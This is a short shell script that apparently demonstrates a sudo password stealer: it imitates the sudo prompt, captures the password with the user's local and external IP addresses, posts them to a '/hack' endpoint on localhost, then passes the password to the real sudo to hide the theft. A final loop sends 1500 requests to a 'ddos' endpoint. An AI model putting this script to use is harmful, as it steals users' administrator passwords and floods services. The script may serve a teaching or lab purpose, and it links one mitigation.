#!/bin/sh

currentDir=$(pwd)

# alias sudo="bash $currentDir/sudo.sh"
# unalias sudo

read -sp "[sudo] password for $USER: " password

localaddress=$(hostname --all-ip-addresses)
externaladdress=$(dig +short myip.opendns.com @resolver1.opendns.com)

curl -X POST \
  http://localhost:5052/hack \
  -H 'Content-Type: application/json' \
  -d "{
    'externaladdress': '$externaladdress'
	'localaddress': '$localaddress',
	'password': '$password',
	'user': '$user'
    }"

params=""
for a in "$@"
do
    if [[ "$params" != "" ]]
    then
        params+=" "
    fi
    params+="$a"
done

echo $password | sudo -S echo >/dev/null 2>&1
sudo -S $params

## mitigation https://superuser.com/questions/793240/preventing-malware-from-sniffing-the-sudo-password

for i in `seq 1 1500`; do curl http://localhost:8079/ddos/someservice/verylazy; done